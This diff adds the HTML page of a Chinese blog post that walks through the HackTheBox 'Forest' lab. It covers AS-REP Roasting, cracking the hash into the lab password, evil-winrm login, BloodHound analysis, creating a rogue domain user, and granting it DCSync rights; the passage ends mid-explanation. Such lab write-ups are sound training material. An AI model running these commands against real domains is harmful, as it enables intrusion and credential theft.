@@ -1,0 +1,1020 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Forest | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇Active Directory 101系列之Forest"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Forest | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇Active Directory 101系列之Forest"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-forest/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2024-06-27T20:12:35&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T09:30:53&#43;08:00" /><meta property="article:tag" content="WindowsAS-REP RoastingDCSync" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Forest"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Forest</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#ldap">LDAP</a></li>
+        <li><a href="#rpc">RPC</a></li>
+      </ul>
+    </li>
+    <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+    <li><a href="#ad域渗透权限提升">AD域渗透权限提升</a>
+      <ul>
+        <li><a href="#bloodhound信息搜集">BloodHound信息搜集</a></li>
+        <li><a href="#信息分析">信息分析</a></li>
+        <li><a href="#创建一个恶意用户">创建一个恶意用户</a></li>
+        <li><a href="#dcsync攻击导出域内哈希">DCSync攻击导出域内哈希</a></li>
+        <li><a href="#pth传递攻击获取root">PTH传递攻击获取Root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-06-27 20:12:35 &#43;0800 CST" itemprop="datePublished"
+      >2024-06-27</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.10.161</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>AD域渗透提取</li>
+<li>AS-REP Roasting攻击</li>
+<li>Hash爆破</li>
+<li>PTH传递攻击</li>
+<li>滥用DCSync</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><h2 id="nmap扫描">
+<a class="header-anchor" href="#nmap%e6%89%ab%e6%8f%8f"></a>
+nmap扫描
+</h2><p>拿namp扫一下</p>
+<p><code>nmap -sS -sV -sC 10.10.10.161</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702183037029-68856069.png" alt="image-20240702183019354"></p>
+<p>发现存在系统<code>Windows Server 2016</code>，有<code>DNS</code>服务，<code>Kerberos</code>服务，<code>smb</code>共享服务，<code>RPC</code>服务，无web页面，只有AD域</p>
+<p>先将域名加到配置文件中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.10.161  htb.local&#34;</span> &gt;&gt; /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.10.161  forest.htb.local&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><blockquote>
+<p>Domain: htb.local</p>
+<p>workgroup: HTB</p>
+</blockquote>
+<h2 id="smb">
+<a class="header-anchor" href="#smb"></a>
+SMB
+</h2><p>尝试匿名登录SMB服务</p>
+<p><code>smbclient -L \\10.10.10.161</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702183130828-1497766679.png" alt="image-20240702183114049"></p>
+<p>也是没有什么重要信息</p>
+<h2 id="ldap">
+<a class="header-anchor" href="#ldap"></a>
+LDAP
+</h2><p>尝试使用ldapsearch工具尝试获取域中的用户列表，根据之前得到的域名<code>htb.local</code>构造如下命令：</p>
+<p><code>ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;CN=users,DC=htb,DC=local&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702192629104-1904357355.png" alt="image-20240702192626662"></p>
+<p>也没什么重要的信息</p>
+<h2 id="rpc">
+<a class="header-anchor" href="#rpc"></a>
+RPC
+</h2><p>利用RPC远程过程调用枚举用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿DESKTOP-K196DPF<span class="o">)</span>-<span class="o">[</span>~/MyFile<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# rpcclient -U <span class="s2">&#34;&#34;</span> -N 10.10.10.161
+</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702193458453-2004846275.png" alt="image-20240702193457026"></p>
+<p>先将用户名整理出来</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">DefaultAccount
+</span></span><span class="line"><span class="cl">$331000-VK4ADACQNUCA
+</span></span><span class="line"><span class="cl">SM_2c8eef0a09b545acb
+</span></span><span class="line"><span class="cl">SM_ca8c2ed5bdab4dc9b
+</span></span><span class="line"><span class="cl">SM_75a538d3025e4db9a
+</span></span><span class="line"><span class="cl">SM_681f53d4942840e18
+</span></span><span class="line"><span class="cl">SM_1b41c9286325456bb
+</span></span><span class="line"><span class="cl">SM_9b69f1b9d2cc45549
+</span></span><span class="line"><span class="cl">SM_c75ee099d0a64c91b
+</span></span><span class="line"><span class="cl">SM_1ffab36a2f5f479cb
+</span></span><span class="line"><span class="cl">HealthMailboxc3d7722
+</span></span><span class="line"><span class="cl">HealthMailboxfc9daad
+</span></span><span class="line"><span class="cl">HealthMailboxc0a90c9
+</span></span><span class="line"><span class="cl">HealthMailbox670628e
+</span></span><span class="line"><span class="cl">HealthMailbox968e74d
+</span></span><span class="line"><span class="cl">HealthMailbox6ded678
+</span></span><span class="line"><span class="cl">HealthMailbox83d6781
+</span></span><span class="line"><span class="cl">HealthMailboxfd87238
+</span></span><span class="line"><span class="cl">HealthMailboxb01ac64
+</span></span><span class="line"><span class="cl">HealthMailbox7108a4e
+</span></span><span class="line"><span class="cl">HealthMailbox0659cc1
+</span></span><span class="line"><span class="cl">sebastien
+</span></span><span class="line"><span class="cl">lucinda
+</span></span><span class="line"><span class="cl">svc-alfresco
+</span></span><span class="line"><span class="cl">andy
+</span></span><span class="line"><span class="cl">mark
+</span></span><span class="line"><span class="cl">santi
+</span></span></code></pre></div><h1 id="as-rep-roasting">
+<a class="header-anchor" href="#as-rep-roasting"></a>
+AS-REP Roasting
+</h1><p>拿到了用户名，这里又暴露了<code>kerberos</code>端口88。尝试一下<code>AS-REP Roasting</code>攻击。</p>
+<p>将上面的用户名保存为<code>user.txt</code>文件，使用<code>GetNPUsers.py</code>尝试向<code>kerberos</code>请求不需要预认证的票据</p>
+<p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.loacl/ -usersfile user.txt  -dc-ip 10.10.10.161</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702195600622-2128859699.png" alt="image-20240702195558839"></p>
+<p>拿到了一个<code>svc-alfresco</code>用户的不需要预认证的票据<code>hash</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5asrep$23$svc-alfresco@HTB.LOCAL:ebdb0e07d33fac124f8f2366a628920c$fbfa4eaefaece3b6ac1f461570a97940f59e4551f620e061054800b9ce7ae9f86f5b711ef4579b3f9ff2706ab69ad3077ad1e4c81d246d7e83a029dff3837b8452ab50cab25aa6b528dce9584fbb87a37cb3589d09baf8a5e0e4f7e500a53c95772701bc45bca89bfacb2602c9192a121f70346f9436869c60b66573c8f0fbf05a36319686fec69cb54a04e311558fcc6790501776b4b1288ee55489e57131aeb4d944ed3769ccf5a26ff4e4cd418657afc6bd827d874faccde4c4dbbd194eba15ef470c69b39099751446310f18d5f800bc8d38c1f8a2b28064fecc963757f6e583d2afdd87
+</span></span></code></pre></div><p>使用<code>john</code>进行破解</p>
+<p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p>
+<p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+<p><code>john hash -show</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702201408699-1289370632.png" alt="image-20240702201407967"></p>
+<p>拿到一个凭证：<code>svc-alfresco : s3rvice</code></p>
+<p>使用<code>evil-winrm</code>远程连接</p>
+<p><code>evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702202206726-73303224.png" alt="image-20240702202205425"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704113818861-542849522.png" alt="image-20240704113809977"></p>
+<p>最后在桌面上拿到<code>user.txt</code></p>
+<h1 id="ad域渗透权限提升">
+<a class="header-anchor" href="#ad%e5%9f%9f%e6%b8%97%e9%80%8f%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+AD域渗透权限提升
+</h1><h2 id="bloodhound信息搜集">
+<a class="header-anchor" href="#bloodhound%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86"></a>
+BloodHound信息搜集
+</h2><p><code>windows</code>权限提升有一款工具叫做<code>BloodHound</code></p>
+<p>这里使用的是kali的<code>BloodHound</code>工具</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 先启动 neo4j</span>
+</span></span><span class="line"><span class="cl">neo4j start <span class="c1"># 访问网址默认用户名和密码都是neo4j，登入后修改密码即可</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 再启动 BloodHound</span>
+</span></span><span class="line"><span class="cl">bloodhound
+</span></span><span class="line"><span class="cl"><span class="c1"># 输入用户名和修改后的密码即可登录</span>
+</span></span></code></pre></div><p><code>SharpHound.exe</code>下载链接：https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</p>
+<p>将<code>SharpHound.exe</code>上传到目标机器并运行，即可得到一个zip文件，该文件里面就是信息搜集的结果，将它下载到本地</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">upload /root/htb/Machines/forest/SharpHound.exe
+</span></span><span class="line"><span class="cl">./SharpHound.exe
+</span></span><span class="line"><span class="cl">download 20240703005056_BloodHound.zip
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703154602854-406882194.png" alt="image-20240703154557962"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703154612998-402889656.png" alt="image-20240703154608670"></p>
+<p>登录到Bloodhound，点击右边上传按钮，将解压后的<code>json</code>文件提交上传</p>
+<p>我们查找一下我们已有用户<code>svc-alfresco</code>相关信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703155415163-444323121.png" alt="image-20240703155410634"></p>
+<h2 id="信息分析">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e5%88%86%e6%9e%90"></a>
+信息分析
+</h2><p>点击左侧<code>Unrolled Group Membership</code>可以发现与其相关的用户组和用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703163424801-1273724818.png" alt="image-20240703163420335"></p>
+<p>重点看下半部分</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703163326843-375757956.png" alt="image-20240703163322390"></p>
+<p>可以发现<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，该组是AD域中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。 但是，不能更改属于<code>Administrators</code>或<code>Domain Admins</code>组的账号，也不能更改这些组。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703170207796-1894446677.png" alt="image-20240703170202999"></p>
+<p>点击<code>Find Shortest Paths to Domain Admins</code>可以看到上图结果</p>
+<p>其中，从<code>svc-alfresco</code>到<code>Domain Admins </code>的路径中发现，<code>EXCHANGE WINDOWS PERMISSIONS</code>组与<code>Account Operators</code> 组有<code>GenericAll</code>关系，表示<code>EXCHANGE WINDOWS PERMISSIONS</code>组完全信任<code>Account Operators</code> 组，而上面还提到<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，且<code>Account Operators</code>组的成员可以创建和管理该域中的用户和组并为其设置权限，因此我们可以利用<code>Account Operators</code>组的权限创建一个新用户，将其添加到<code>EXCHANGE WINDOWS PERMISSIONS</code>组，同时可以看到<code>EXCHANGE WINDOWS PERMISSIONS</code>组的成员对<code>HTB.LOCAL</code>有<code>WriteDacl</code>权限，可以用新添加的用户对<code>HTB.LOCAL</code>的<code>WriteDacl</code>权限进行恶意利用，从而实现提权</p>
+<h2 id="创建一个恶意用户">
+<a class="header-anchor" href="#%e5%88%9b%e5%bb%ba%e4%b8%80%e4%b8%aa%e6%81%b6%e6%84%8f%e7%94%a8%e6%88%b7"></a>
+创建一个恶意用户
+</h2><p>回到<code>Evil-WinRM</code>，先利用<code>ACCOUNT OPERATION</code>的权限去创建一个新的用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">net user popayw 123abc! /add /domain	<span class="c1"># 创建用户</span>
+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;Exchange Windows Permissions&#34;</span> popayw /add	<span class="c1"># 将用户添加到Exchange Windows Permissions组</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705131624984-738117392.png" alt="image-20240705131611080"></p>
+<p>用户创建完毕，再利用<code>WriteDacl</code>权限去给我们用户所在组加权限，这里使用<code>PowerSploit</code>中的<code>powerview.ps1</code>来滥用<code>WriteDacl</code>权限，通过<code>upload</code>将<code>powerview.ps1</code>文件传进去</p>
+<p>运行命令导入脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">. .<span class="se">\P</span>owerView.ps1
+</span></span></code></pre></div><p>这时候就会发现运行<code>menu</code>模块增加</p>
+<ul>
+<li>运行之前</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704140311010-817859956.png" alt="image-20240704140302757"></p>
+<ul>
+<li>运行之后</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704140329286-337456579.png" alt="image-20240704140320314"></p>
+<p>再定义两个变量，用于创建凭证对象并授予 <code>DCSync</code> 权限，其中<code>Add-DomainObjectAcl</code>模块可以添加<code>DCSync</code>权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> convertto-securestring <span class="s1">&#39;123abc!&#39;</span> -AsPlainText -Force
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s1">&#39;HTB\popayw&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">Add-DomainObjectAcl -Credential <span class="nv">$cred</span> -TargetIdentity <span class="s2">&#34;DC=htb,DC=local&#34;</span> -PrincipalIdentity popayw -Rights DCSync
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704142421132-450044665.png" alt="image-20240704142412881"></p>
+<h2 id="dcsync攻击导出域内哈希">
+<a class="header-anchor" href="#dcsync%e6%94%bb%e5%87%bb%e5%af%bc%e5%87%ba%e5%9f%9f%e5%86%85%e5%93%88%e5%b8%8c"></a>
+DCSync攻击导出域内哈希
+</h2><ul>
+<li>DCSync攻击原理</li>
+</ul>
+<blockquote>
+<p><strong>主要利用的是域控制器之间的数据同步复制</strong></p>
+<p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。
+如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p>
+</blockquote>
+<p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p>
+<ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
